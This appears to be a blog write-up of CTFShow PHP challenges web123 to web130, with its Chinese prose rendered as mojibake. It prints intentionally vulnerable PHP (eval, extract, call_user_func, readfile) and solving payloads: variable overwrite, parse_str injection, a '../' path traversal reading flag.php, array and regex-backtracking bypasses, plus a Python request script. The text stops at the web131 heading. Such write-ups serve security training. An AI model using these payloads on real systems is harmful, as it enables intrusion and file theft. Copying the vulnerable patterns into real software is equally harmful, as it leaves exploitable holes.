<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Firebasky</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-07 22:02:47</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class="line">$c=$_POST[&#x27;fun&#x27;];</span><br><span class="line">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class="line">    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;, $c)&amp;&amp;$c&lt;=18)&#123;</span><br><span class="line">         eval(&quot;$c&quot;.&quot;;&quot;);  </span><br><span class="line">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class="line">             echo $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>è¿™é“é¢˜ä¸çœ‹æç¤ºï¼Œæˆ‘çœŸä¸çŸ¥é“ php ä¼šæŠŠ è·å–åˆ°çš„å‚æ•° å°æ•°ç‚¹ è‡ªåŠ¨è½¬åŒ–ä¸º ä¸‹åˆ’çº¿ : . _ ; ä¸‹åˆ’çº¿åˆç­‰äº[, è€Œä¸”åªä¼šè½¬æ¢ä¸€æ¬¡.</li>
<li>å…ˆçœ‹ç»™å‡ºçš„ç­”æ¡ˆ: <strong>CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=echo $flag</strong> ,å…¶ä¸­å°† CTF_SHOW.COM ä¸­ä¸‹åˆ’çº¿æ”¹ä¸ºäº†[ è¿™æ ·è½¬æ¢äº†ä¸€æ¬¡åé¢çš„å°æ•°ç‚¹å°†ä¸ä¼šè‡ªåŠ¨è½¬æ¢ä¸º _(ä¸‹åˆ’çº¿)</li>
<li>æœ¬åœ°è¯•éªŒçœ‹çœ‹:</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web123.png"></p>
<ul>
<li>å¦‚å›¾æ‰€ç¤º: å¦‚æœåŸå°ä¸åŠ¨çš„ä¼ å…¥å‚æ•°,var_dump() å°†ä¸ä¼šæ‰§è¡Œï¼Œå”¯æœ‰æ‰‹åŠ¨å°†ç¬¬ä¸€ä¸ªä¸‹åˆ’çº¿æ”¹ä¸º[ï¼ˆå·¦ä¸­æ‹¬å·æ‰èƒ½è¡Œï¼‰,è¿™ä¸ªç‰¹æ€§ğŸ‚ğŸº</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web123_1.png"></p>
<h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li>åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šå¢åŠ äº† å¯¹ flag, echo ,GLOBALS, var_dump, print çš„è¿‡æ»¤</li>
<li>GET:?1=flag.php POST: CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=highlight_file($_GET[1])</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web125.png"></p>
<ul>
<li>CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=extract($_POST)&amp;fl0g=flag_give_me</li>
<li>extract() å‡½æ•°å¯ä»¥è¦†ç›–å˜é‡ï¼Œå­¦åˆ°äº†</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web125_1.png"></p>
<h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><p>æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="variable">$c</span>) &amp;&amp; strlen(<span class="variable">$c</span>)&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li>åˆå¢åŠ äº†ç¬¬ g i f c o d çš„è¿‡æ»¤</li>
<li>GET:?a=1+fl0g=flag_give_me<br>POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web126.png"></p>
<ul>
<li>æä¸æ‡‚,æˆ‘æ˜¯å‚»é€¼</li>
</ul>
<h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-10 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-10 21:52:49</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = md5(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç‰¹æ®Šå­—ç¬¦æ£€æµ‹</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(waf(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å—¯å“¼ï¼Ÿ&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li>é¦–å…ˆé˜…è¯»ç¨‹åºä¸Šä¸‹æ–‡ï¼Œ$ctf_show = md5($flag) å°†å˜é‡ flag md5è½¬æ¢è¿‡åèµ‹å€¼ç»™äº† å˜é‡ ctf_show, ç´§æ¥ç€ä¸‹ä¸€å¥: $url = $_SERVER[â€˜QUERY_STRINGâ€™]; $_SERVER æ˜¯ä¸€ä¸ªåŒ…å«äº†è¯¸å¦‚å¤´ä¿¡æ¯(header)ã€è·¯å¾„(path)ã€ä»¥åŠè„šæœ¬ä½ç½®(script locations)ç­‰ç­‰ä¿¡æ¯çš„æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„ä¸­çš„é¡¹ç›®ç”± Web æœåŠ¡å™¨åˆ›å»ºï¼ŒQUERY_STRING:</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web127.png"></p>
<ul>
<li>æœ¬åœ°è¯•éªŒä¸€ä¸‹ï¼š</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web127_1.png"></p>
<ul>
<li>ä»è¿”å›çš„ç»“æœæ¥çœ‹ï¼Œ$_SERVERçš„ç¡®åŒ…å«äº†æœåŠ¡å™¨çš„ä¸€äº›ä¿¡æ¯ï¼Œå…¶ä¸­ QUERY_STING é€šè¿‡GETæ–¹å¼ä¼ å…¥äº†ä¸€äº›å‚æ•°å¹¶ä¸”ä¹Ÿå°†å…¶è¿”å›äº†å‡ºæ¥å¦‚ä¸Šå›¾çº¢æ¡†å¤„æ ‡è®°ï¼Œå…¶å®è¿™å°±æ˜¯é€šè¿‡GETæ–¹å¼ä¼ å…¥äº†ä¸€ä¸ªå˜é‡ã€‚</li>
<li>ç»§ç»­å¾€ä¸‹çœ‹ç¨‹åºä»£ç ï¼šå‡½æ•°waf å¯¹ å˜é‡ url è¿‘äº›äº†è¿‡æ»¤ï¼›ç»§ç»­å¾€ä¸‹çš„ if åˆ¤æ–­ä¸­else: extract($_GET) è¿›è¡Œäº†å˜é‡è¦†ç›–ï¼Œè¿™é‡Œæ‰æ˜¯çœŸæ­£çš„å˜é‡è¦†ç›–ï¼Œé‚£å°±è¦ç»•è¿‡ waf çš„é˜»æ‹¦è®©å…¶ä¸º false ç„¶å if åˆ¤æ–­æ‰§è¡Œelseçš„å˜é‡è¦†ç›–ã€‚</li>
<li>å†å¾€ä¸‹æ‰§è¡Œä»£ç ï¼šå‘ç° å˜é‡ ctf_show å…¨ç­‰äº ilove36d, å˜¿å˜¿å˜¿ï¼Œè°ä¸å–œæ¬¢36Då•Š</li>
<li>ç»¼ä¸Šæ‰€è¿° åˆ©ç”¨å˜é‡è¦†ç›–è¾¾åˆ°ç›®çš„ã€‚</li>
<li>?ctf_show=ilove36d, æ­¤æ—¶ä¸è¡Œï¼Œå¯¹ä¸‹åˆ’çº¿è¿›è¡Œäº†è¿‡æ»¤ï¼Œå› ä¸ºPHPä¸­å˜é‡çš„ç»„æˆä¸ºï¼š å­—æ¯ï¼Œæ•°å­—ï¼Œä¸‹åˆ’çº¿ï¼Œæ•°å­—ä¸èƒ½å¼€å¤´ï¼Œå¦‚æœå˜é‡åæœ‰ <strong>ç‚¹</strong> å’Œ <strong>ç©ºæ ¼</strong> ä¼šå°†å…¶è‡ªåŠ¨è½¬æ¢ä¸º ä¸‹åˆ’çº¿ï¼Œé‚£ä¹ˆå¯ä»¥å¾—åˆ°: </li>
<li>?ctf show=ilove36d</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web127_2.png"></p>
<h2 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-10 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-12 19:49:05</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(check(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    var_dump(call_user_func(call_user_func(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å—¯å“¼ï¼Ÿ&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !preg_match(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li>è¿™é“é¢˜æ­£å¦‚é¢˜ç›®æè¿°ä¸€æ ·åˆæ˜¯ä¸ªä¸çŸ¥é“çš„<strong>éªšæ“ä½œ</strong> ğŸ‚ğŸº 666</li>
<li>é˜…è¯»ç¨‹åºä¸Šä¸‹æ–‡å‘ç°å¤´ä¸€æ¬¡è§ <strong>call_user_func()</strong> æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨ã€‚å…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°ï¼Œæ‰€ä»¥ $f1 ä¸ºä¸€ä¸ªå‡½æ•°ï¼Œ$f2 ä¸ºè¿™ä¸ªå‡½æ•°çš„å‚æ•°ã€‚</li>
<li>å†å¾€ä¸‹çœ‹ å®šä¹‰äº†ä¸€ä¸ª check() å‡½æ•°ï¼Œå¯¹ <strong>æ•°å­—å­—æ¯</strong>è¿›è¡Œäº†è¿‡æ»¤ã€‚</li>
<li>è¿™é“é¢˜çš„éªšæ“ä½œæ˜¯åˆ©ç”¨äº† gettext æŸ¥æ‰¾ php æ‰‹å†Œ</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web128.png"></p>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web128_1.png"></p>
<ul>
<li>å¦‚å›¾æ‰€ç¤º : æ‚¨å¯ä»¥ä½¿ç”¨ä¸‹åˆ’çº¿å­—ç¬¦â€œ_â€ä½œä¸ºæ­¤å‡½æ•°çš„åˆ«åã€‚ğŸ‚ğŸº 666</li>
<li>get_defined_varsï¼ˆï¼‰è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰çš„å˜é‡æ‰€ç»„æˆçš„æ•°ç»„</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web128_2.png"></p>
<ul>
<li>?f1=_&amp;f2=get_defined_vars</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web128_3.png"></p>
<h2 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h2><p>æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-13 03:18:40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> readfile(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li><p>é˜…è¯»ç¨‹åºä¸Šä¸‹æ–‡ï¼Œä½¿ç”¨äº† <strong>stripos</strong>() å‡½æ•°ï¼šæŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®ä¸åŒºåˆ†å¤§å°å†™ï¼Œä»0å¼€å§‹è®¡æ•°ã€‚ä¸ <a href="mk:@MSITStore:D:\MY-CODE\PHP\php7.3.8æ‰‹å†Œï¼ˆå®˜ç½‘ï¼‰\php7.3.8æ‰‹å†Œï¼ˆå®˜ç½‘ï¼‰\php7.3.8ï¼ˆå®˜ç½‘ä¸‹è½½ï¼‰.chm::/res/function.strpos.html">strpos()</a> ä¸åŒï¼Œ<strong>stripos()</strong> ä¸åŒºåˆ†å¤§å°å†™ã€‚</p>
</li>
<li><p>readfile() è¾“å‡ºæ–‡ä»¶ï¼Œè¯»å…¥çš„æ–‡ä»¶å</p>
</li>
<li><p>å¯ä»¥å¾—åˆ°: </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?f=/ctfshow../../../../<span class="keyword">var</span>/www/html/flag.php </span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web129.png"></p>
<h2 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-13 05:19:40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<p>æºç :</p>
<p>é¦–å…ˆé˜…è¯»ç¨‹åºä¸Šä¸‹æ–‡ã€‚å‘ç°æ­£åˆ™åŒ¹é… <code>&#39;/.+?ctfshow/is&#39;</code> , iä¸åŒºåˆ†å¤§å°å†™ï¼Œ s åŒ¹é…æ¢è¡Œç¬¦ï¼Œ+ åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ï¼Œï¼ŸåŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡ï¼Œ. é»˜è®¤æƒ…å†µä¸‹çš„åœ†ç‚¹ <strong>.</strong> æ˜¯ åŒ¹é…é™¤æ¢è¡Œç¬¦ <strong>\n</strong> ä¹‹å¤–çš„ä»»ä½•å­—ç¬¦ï¼Œ</p>
<p>éœ€è¦æ³¨æ„ä¸­é—´çš„ ? (é—®å·) åœ¨ å­—ç¬¦ä¸²ctfshowå‰é¢å¿…é¡»æœ‰ä¸€ä¸ªæˆ–0ä¸ªå­—ç¬¦ï¼Œ åªå†™ ctfshow å³å¯ç»•è¿‡ã€‚</p>
<p>ç»§ç»­å¾€ä¸‹çœ‹ï¼Œstripos() å’Œä¸Šä¸€é¢˜ä¸€æ ·åŒ¹é…å­—ç¬¦ä¸² ctfshow é¦–æ¬¡å‡ºç°çš„ä½ç½®ï¼Œæ­¤å¤„ä¸ºä¸‰ä¸ªç­‰å· === å…¨ç­‰æ¯”è¾ƒæ•°å€¼å’Œç±»å‹ï¼Œå¦‚æœåŒ¹é…å‡ºå­—ç¬¦å‡ºé¦–æ¬¡å‡ºç°çš„ä½ç½®ä¸º 0 ï¼Œ0 (int)ï¼Œ ä¸ FALSE(bool) è‡ªç„¶ä¸æƒ³ç­‰å°±ç­‰ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">f=ctfshow</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web130.png"></p>
<p>strpos &amp;&amp; stripos å¯ä»¥æ•°ç»„ç»•è¿‡ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">f[]=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web130_1.png"></p>
<p>æœ¬é¢˜æœ‰ä¸ªæç¤ºï¼švery very veryï¼ˆçœç•¥25ä¸‡ä¸ªveryï¼‰ctfshowï¼Œæ®è¯´æ­£åˆ™æœ€å¤šåŒ¹é…25wæ¬¡ï¼Œä¹‹åå°±ä¸è¡Œäº†ã€‚çœŸâ„¢<strong>éªš</strong></p>
<p>é‚£ä¹ˆå¯ä»¥å†™ä¸ªè„šæœ¬:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://e3081345-a5cb-4efc-a89c-3e4f4e66a000.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<p>postä¸­çš„å†…å®¹ very ç”Ÿæˆäº†25000æ¬¡ï¼Œè¶…è¿‡äº†æœ€å¤§å€¼ï¼Œè¿”å› <strong>false</strong> ï¼ŒåŒæ—¶å…¶ä¸­åŒ…å« å­—ç¬¦ä¸² <strong>ctfshow</strong> å°±ç»•è¿‡äº†ç¬¬äºŒä¸ª striposåˆ†æ”¯ï¼Œæœ€ç»ˆå¾—åˆ° falg</p>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web130_2.png"></p>
<h2 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h2><p>æºç :</p>
